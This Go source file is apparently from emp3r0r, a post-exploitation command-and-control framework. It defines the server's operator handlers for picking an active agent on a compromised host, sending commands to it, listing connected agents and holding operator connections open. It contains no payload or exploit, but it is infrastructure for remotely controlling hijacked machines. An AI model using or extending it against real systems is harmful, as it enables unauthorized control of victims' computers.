package server

import (
	"context"
	"encoding/json"
	"net/http"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/posener/h2conn"
)

// operators holds all operator connections
var operators = make(map[string]*h2conn.Conn)

// DecodeJSONBody decodes JSON HTTP request body
func DecodeJSONBody[T any](wrt http.ResponseWriter, req *http.Request) (*T, error) {
	var dst T
	if err := json.NewDecoder(req.Body).Decode(&dst); err != nil {
		http.Error(wrt, err.Error(), http.StatusBadRequest)
		return nil, err
	}
	return &dst, nil
}

func handleSetActiveAgent(wrt http.ResponseWriter, req *http.Request) {
	// Decode JSON request body
	operation, err := DecodeJSONBody[def.Operation](wrt, req)
	if err != nil {
		return
	}

	// Set active agent
	agents.SetActiveAgent(operation.AgentTag)

	// Return active agent
	if err := json.NewEncoder(wrt).Encode(live.ActiveAgent); err != nil {
		http.Error(wrt, err.Error(), http.StatusInternalServerError)
	}
}

func handleSendCommand(wrt http.ResponseWriter, req *http.Request) {
	// Decode JSON request body
	operation, err := DecodeJSONBody[def.Operation](wrt, req)
	if err != nil {
		return
	}

	// Get agent
	agent := agents.GetAgentByTag(operation.AgentTag)
	if agent == nil {
		http.Error(wrt, "Agent not found", http.StatusNotFound)
		return
	}

	// Get command and command ID
	if !operation.IsOptionSet("command") || !operation.IsOptionSet("command_id") {
		http.Error(wrt, "Command or CommandID is empty", http.StatusBadRequest)
		return
	}

	// Send command to agent
	err = agents.SendCmd(*operation.Command, *operation.CommandID, agent)
	if err != nil {
		http.Error(wrt, err.Error(), http.StatusInternalServerError)
		return
	}
	wrt.WriteHeader(http.StatusOK)
}

func handleListAgents(wrt http.ResponseWriter, _ *http.Request) {
	// Get all agents
	agentsList := agents.GetConnectedAgents()
	if err := json.NewEncoder(wrt).Encode(agentsList); err != nil {
		http.Error(wrt, err.Error(), http.StatusInternalServerError)
	}
}

// handleOperatorConn handles operator connections, this connection will be used to relay the message tunnel
func handleOperatorConn(wrt http.ResponseWriter, req *http.Request) {
	conn, err := h2conn.Accept(wrt, req)
	if err != nil {
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	operator_session := req.Header.Get("operator_session")
	logging.Infof("Operator connected: %s", operator_session)
	operators[operator_session] = conn

	ctx, cancel := context.WithCancel(context.Background())
	defer func() {
		logging.Debugf("handleOperatorConn exiting")
		delete(operators, operator_session)
		_ = conn.Close()
		cancel()
	}()

	// keep the connection alive
	for ctx.Err() == nil {
		time.Sleep(1 * time.Second)
	}
}
